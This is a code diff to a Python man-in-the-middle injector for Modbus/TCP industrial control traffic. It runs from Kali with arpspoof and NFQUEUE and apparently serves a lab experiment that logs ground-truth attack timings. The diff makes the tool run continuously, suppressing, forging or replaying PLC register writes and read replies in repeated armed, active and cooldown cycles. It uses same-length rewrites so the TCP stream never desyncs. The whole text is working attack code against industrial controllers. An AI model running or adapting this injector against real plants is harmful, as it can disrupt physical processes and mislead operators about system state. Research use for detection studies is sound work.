@@ -64,7 +64,7 @@ SAME-LENGTH REWRITES ONLY: register values are fixed 2-byte fields, so rewrites
 are length-preserving -> the TCP stream never desyncs.
 
 GROUND-TRUTH LOG: results/<run_id>/attack_log.json (share --run-id with the
-experiment logger; align pcap + state + attack-log by run_id + window_open_wall).
+experiment logger; align pcap + state + attack-log by run_id + each event onset_wall).
 NTP-sync Kali and the SCADA PC so cross-host timestamps are comparable.
 
 INSTALL (Kali):
@@ -124,15 +124,27 @@ MAX_LOG_EVENTS = 20000        # cap the per-packet event list (counters stay exa
 
 # RUNTIME STATE  (mutated by the packet handler and the main loop)
 
+# The injector runs CONTINUOUSLY until Ctrl-C, cycling three phases PER ATTACK:
+#   armed    -> waiting for the trigger (the target transition on the wire)
+#   active   -> trigger seen; acting (suppress/forge/replay) for --hold seconds
+#   cooldown -> done acting; waiting --re-arm seconds, then back to armed
+# Each active window is one ATTACK EVENT (own onset/close), so you can suppress
+# several hand-offs within a single logger run and get N onset-aligned repeats.
+# STATE["finished"] is set ONLY by Ctrl-C.
 STATE = {
-    "window_open": False, "finished": False,
+    "phase": "armed",            # armed | active | cooldown
+    "finished": False,           # set ONLY by Ctrl-C (SIGINT/SIGTERM)
     "armed_ts": None, "armed_wall": None,
-    "open_ts": None, "open_wall": None, "close_wall": None,
+    "open_ts": None, "open_wall": None,   # current active window's onset
+    "cooldown_ts": None,                  # when the current cooldown began
+    "event_index": 0,                     # how many attack events so far
+    "event_base": None,                   # COUNTERS snapshot at the event's open
 }
 COUNTERS = {"matched": 0, "dropped": 0, "rewritten": 0, "passed": 0, "injected": 0}
-EVENTS = []
-PENDING_READS = {}   # (client_src_port, txid) -> (start_addr, qty, monotonic)
-CFG = {}             # resolved attack params, filled by main()
+EVENTS = []              # per-packet manipulation log (capped)
+ATTACK_EVENTS = []       # one entry per attack window: index, onset/close, counts
+PENDING_READS = {}       # (client_src_port, txid) -> (start_addr, qty, monotonic)
+CFG = {}                 # resolved attack params, filled by main()
 
 
 # 
@@ -345,12 +357,11 @@ def _handle(packet):
     to_value = CFG["to_value"]
     action   = CFG["action"]
     
-    # Close the window from inside the handler too, so a heavy packet stream
-    # (which can starve the main-loop clock) still ends the hold on time.
-    if STATE["window_open"] and STATE["open_ts"] is not None \
+    # End the ACTIVE window on time even under a heavy packet stream (which can
+    # starve the main-loop clock). This enters COOLDOWN, not shutdown.
+    if STATE["phase"] == "active" and STATE["open_ts"] is not None \
             and (time.monotonic() - STATE["open_ts"]) >= CFG["hold"]:
-        STATE["window_open"] = False
-        STATE["finished"] = True
+        _close_event()
         
     # Track FC03 read REQUESTS so we can locate `reg` inside the matching REPLY.
     if to_ab and fc == FC_READ_HOLDING and len(load) >= 12:
@@ -363,8 +374,8 @@ def _handle(packet):
     if carrier == "write" and to_ab and fc in (FC_WRITE_SINGLE, FC_WRITE_MULTIPLE):
         if action == "suppress":
             if _write_sets_reg_to(load, fc, reg, signal_v):
-                _maybe_open_window()
-                if STATE["window_open"]:
+                _maybe_open_event()                 # trigger: opens iff ARMED
+                if STATE["phase"] == "active":
                     COUNTERS["matched"] += 1
                     COUNTERS["dropped"] += 1
                     log_event({"ts": now_iso(), "action": "drop_write",
@@ -373,9 +384,8 @@ def _handle(packet):
         else:   # forge / replay: rewrite the written value TO the signal
             voff = _value_offset_in_write(load, fc, reg)
             if voff is not None:
-                if not STATE["window_open"] and not CFG["time_mode"]:
-                    _open_window()
-                if STATE["window_open"]:
+                _maybe_open_event()
+                if STATE["phase"] == "active":
                     desired = signal_v if to_value is None else to_value
                     if u16(load, voff) != desired:
                         prev = _rewrite_value(pkt, load, voff, desired, packet)
@@ -411,13 +421,10 @@ def _handle(packet):
             desired = signal_v if to_value is None else to_value
             trigger_here = True
 
-        if not STATE["window_open"]:
-            if CFG["time_mode"]:
-                pass
-            elif trigger_here:
-                _open_window()
+        if STATE["phase"] == "armed" and not CFG["time_mode"] and trigger_here:
+            _open_event()                           # trigger: opens iff ARMED
 
-        if STATE["window_open"] and current != desired:
+        if STATE["phase"] == "active" and current != desired:
             prev = _rewrite_value(pkt, load, voff, desired, packet)
             COUNTERS["matched"] += 1
             COUNTERS["rewritten"] += 1
@@ -435,76 +442,100 @@ def _handle(packet):
 #
 # WINDOW STATE MACHINE
 #
-def _open_window():
-    """Mark the window OPEN and record the onset timestamp.
+def _open_event():
+    """Enter the ACTIVE phase: a trigger fired, start acting for --hold seconds.
 
-    Called from: the handler (event mode, first actionable packet) and
-    check_timing() (time mode, immediately).
+    Called from: _maybe_open_event() (event mode) and check_timing() (time mode).
+    Opens ONLY from the ARMED phase (so a trigger during cooldown is ignored).
+    Snapshots the global counters so this event's dropped/rewritten totals can be
+    computed at close.
 
     Returns:
         None.
     """
-    STATE["window_open"] = True
+    if STATE["phase"] != "armed":
+        return
+    STATE["phase"] = "active"
     STATE["open_ts"] = time.monotonic()
     STATE["open_wall"] = now_iso()
-    print(f"[{STATE['open_wall']}] WINDOW OPEN (onset) -- acting for {CFG['hold']} s")
+    STATE["event_index"] += 1
+    STATE["event_base"] = dict(COUNTERS)
+    print(f"[{STATE['open_wall']}] ATTACK #{STATE['event_index']} OPEN (onset) "
+          f"-- acting for {CFG['hold']} s")
 
 
-def _maybe_open_window():
-    """Open the window on the first matching write, but only in event mode.
+def _maybe_open_event():
+    """Open an attack event on a matching trigger — only while ARMED, event mode.
 
-    Called from: the write-carrier SUPPRESS branch (time mode opens via
-    check_timing).
-
-    Returns:
-        None.
-    """
-    if not STATE["window_open"] and not CFG["time_mode"]:
-        _open_window()
-
-
-def _close_window():
-    """Mark the window CLOSED and record the close timestamp (once).
-
-    Called from: check_timing() (hold elapsed) and main()'s finally block.
+    Called from: the handler's action branches when the target transition is seen.
 
     Returns:
         None.
     """
-    if STATE["window_open"]:
-        STATE["window_open"] = False
-        STATE["close_wall"] = now_iso()
-        print(f"[{STATE['close_wall']}] WINDOW CLOSED")
+    if STATE["phase"] == "armed" and not CFG["time_mode"]:
+        _open_event()
+
+
+def _close_event():
+    """Leave ACTIVE: stop acting, record the event, enter COOLDOWN.
+
+    Called from: check_timing() and the handler when --hold elapses, and from
+    main()'s finally on Ctrl-C (to finalize an in-progress event). Computes the
+    event's counter deltas and appends it (onset, close, dropped/rewritten/matched)
+    to ATTACK_EVENTS. No-op unless currently ACTIVE.
+
+    Returns:
+        None.
+    """
+    if STATE["phase"] != "active":
+        return
+    STATE["phase"] = "cooldown"
+    STATE["cooldown_ts"] = time.monotonic()
+    close_wall = now_iso()
+    base = STATE["event_base"] or {}
+    ev = {
+        "index": STATE["event_index"],
+        "onset_wall": STATE["open_wall"],
+        "close_wall": close_wall,
+        "dropped": COUNTERS["dropped"] - base.get("dropped", 0),
+        "rewritten": COUNTERS["rewritten"] - base.get("rewritten", 0),
+        "matched": COUNTERS["matched"] - base.get("matched", 0),
+    }
+    ATTACK_EVENTS.append(ev)
+    print(f"[{close_wall}] ATTACK #{ev['index']} CLOSED "
+          f"(dropped={ev['dropped']} rewritten={ev['rewritten']}) "
+          f"-- re-arm in {CFG['re_arm']} s")
 
 
 def check_timing(args):
-    """Drive the window clock from the main loop (~2x/second).
+    """Drive the arm/active/cooldown clock from the main loop (~2x/second).
 
-    Called from: main()'s NFQUEUE loop between packet batches. Opens the window in
-    time mode, closes it when the hold elapses, and aborts in event mode if the
-    trigger never appears within --max-wait.
+    Called from: main()'s NFQUEUE loop between packet batches. Transitions:
+        active   -> cooldown   when --hold   elapses  (stop acting, log the event)
+        cooldown -> armed      when --re-arm elapses  (wait for the next trigger)
+        armed    -> active     immediately, in TIME mode only (periodic attacks)
+    Runs INDEFINITELY — never sets finished (only Ctrl-C does).
 
     Args:
-        args (argparse.Namespace): parsed CLI (uses args.max_wait).
+        args (argparse.Namespace): parsed CLI (unused here; kept for signature).
 
     Returns:
-        None. May set STATE["finished"]=True.
+        None.
     """
     nowm = time.monotonic()
-    # time mode: open immediately
-    if CFG["time_mode"] and not STATE["window_open"] and STATE["open_ts"] is None:
-        _open_window()
-    # once open, close + FINISH when hold elapses:
-    if STATE["window_open"] and STATE["open_ts"] is not None \
+    if STATE["phase"] == "active" and STATE["open_ts"] is not None \
             and (nowm - STATE["open_ts"]) >= CFG["hold"]:
-        _close_window()
-        STATE["finished"] = True
+        _close_event()
         return
-    # event mode: abort ONLY if the window NEVER opened within max_wait:
-    if (not CFG["time_mode"] and STATE["open_ts"] is None
-            and (nowm - STATE["armed_ts"]) >= args.max_wait):
-        print(f"[{now_iso()}] trigger not seen within {args.max_wait}s -- giving up")
-        STATE["finished"] = True
+    if STATE["phase"] == "cooldown" and STATE["cooldown_ts"] is not None \
+            and (nowm - STATE["cooldown_ts"]) >= CFG["re_arm"]:
+        STATE["phase"] = "armed"
+        print(f"[{now_iso()}] RE-ARMED -- waiting for next trigger "
+              f"(event #{STATE['event_index'] + 1}) ...")
+        return
+    # TIME mode: fire immediately whenever armed (periodic: hold on, re-arm off).
+    if CFG["time_mode"] and STATE["phase"] == "armed":
+        _open_event()
 
 
 #
@@ -633,8 +664,8 @@ def teardown_network():
 def write_attack_log(args, client_ip, profile):
     """Write the ground-truth attack-log JSON for this run.
 
-    Called from: main()'s finally block, after teardown. window_open_wall is the
-    onset to align with the pcap and state log.
+    Called from: main()'s finally block, after teardown. Each attack event's onset_wall is a
+    t=0 to align the pcap and state planes (N events = N aligned repeats).
 
     Args:
         args (argparse.Namespace): parsed CLI.
@@ -655,12 +686,16 @@ def write_attack_log(args, client_ip, profile):
             "signal_value": profile["signal"], "to_value": CFG["to_value"],
             "sensor_defended": profile["defended"], "transition_tag": profile["tag"],
             "trigger_mode": "time" if CFG["time_mode"] else "event",
-            "hold_s": CFG["hold"], "iface": args.iface,
+            "hold_s": CFG["hold"], "re_arm_s": CFG["re_arm"], "iface": args.iface,
             "client_ip": client_ip, "ab_ip": AB_IP, "spoofer": "arpspoof",
         },
         "armed_wall": STATE["armed_wall"],
-        "window_open_wall": STATE["open_wall"],
-        "window_close_wall": STATE["close_wall"],
+        "stopped_wall": now_iso(),
+        # Each attack event is an independent, onset-aligned window. The analyser
+        # treats every entry's onset_wall as a t=0 to align the wire + physical
+        # planes -- so N events in one run = N aligned repeats.
+        "n_attack_events": len(ATTACK_EVENTS),
+        "attack_events": ATTACK_EVENTS,
         "counters": COUNTERS,
         "events": EVENTS,
         "events_truncated": len(EVENTS) >= MAX_LOG_EVENTS,
@@ -692,15 +727,20 @@ def build_parser():
     p.add_argument("--iface", required=True, help="Kali control-LAN interface (for arpspoof)")
     p.add_argument("--run-id", required=True, help="shared with the experiment logger")
     p.add_argument("--hold", type=float, default=30.0,
-                   help="event-mode window seconds once open (default 30)")
+                   help="seconds to ACT (suppress/forge/replay) per attack event (default 30)")
+    p.add_argument("--re-arm", type=float, default=10.0, dest="re_arm",
+                   help="cooldown seconds after an event before re-arming for the "
+                        "next trigger (default 10). The injector runs until Ctrl-C, "
+                        "so you can land several attacks in one logger run.")
     p.add_argument("--window-trigger", type=float, default=None, metavar="SEC",
-                   help="TIME mode: open immediately and act for SEC seconds. "
-                        "Omit for EVENT mode.")
+                   help="TIME mode: act immediately (no trigger) for SEC seconds per "
+                        "event, re-arming every --re-arm s (periodic attacks). "
+                        "Omit for EVENT mode (wait for the target transition).")
     p.add_argument("--to-value", type=int, default=None,
                    help="override the rewritten/forged value. Default suppress->0, "
                         "forge/replay->signal.")
     p.add_argument("--max-wait", type=float, default=120.0,
-                   help="event mode: give up if the trigger isn't seen in this many s")
+                   help="(deprecated: the injector now runs indefinitely until Ctrl-C)")
     p.add_argument("--queue-num", type=int, default=QUEUE_NUM, help="NFQUEUE number")
     p.add_argument("--results", default=RESULTS_DEFAULT, help="output directory")
     p.add_argument("--no-spoof", action="store_true",
@@ -766,6 +806,7 @@ def main():
         "action": args.action, "to_value": to_value,
         "time_mode": args.window_trigger is not None,
         "hold": args.window_trigger if args.window_trigger is not None else args.hold,
+        "re_arm": args.re_arm,
     })
 
     print("=" * 72)
@@ -773,8 +814,9 @@ def main():
     print(f"   pair/transition : {args.pair} / {args.transition}  (reg {profile['reg']}, "
           f"signal={profile['signal']}, carrier={profile['carrier']})")
     print(f"   action          : {args.action}")
-    print(f"   trigger         : {'time-based' if CFG['time_mode'] else 'event-triggered'}"
-          f"  hold={CFG['hold']} s")
+    print(f"   trigger         : {'time-based (periodic)' if CFG['time_mode'] else 'event-triggered'}"
+          f"   hold={CFG['hold']} s   re-arm={CFG['re_arm']} s")
+    print(f"   mode            : CONTINUOUS -- lands repeated attacks until you Ctrl-C")
     print(f"   on-path         : {client_ip} <-> {AB_IP} via {args.iface}"
           f"{' (arpspoof SKIPPED)' if args.no_spoof else ''}")
     print(f"   sensor-defended : {profile['defended']}")
@@ -812,12 +854,13 @@ def main():
             check_timing(args)
         s.close()
     finally:
-        _close_window()
+        _close_event()                       # finalize an in-progress event (Ctrl-C)
         try: nfqueue.unbind()
         except Exception: pass
         teardown_network()
         write_attack_log(args, client_ip, profile)
-        print(f"counters: {COUNTERS}")
+        print(f"\nstopped by user. attack events: {len(ATTACK_EVENTS)}  "
+              f"total counters: {COUNTERS}")
     return 0
 
 
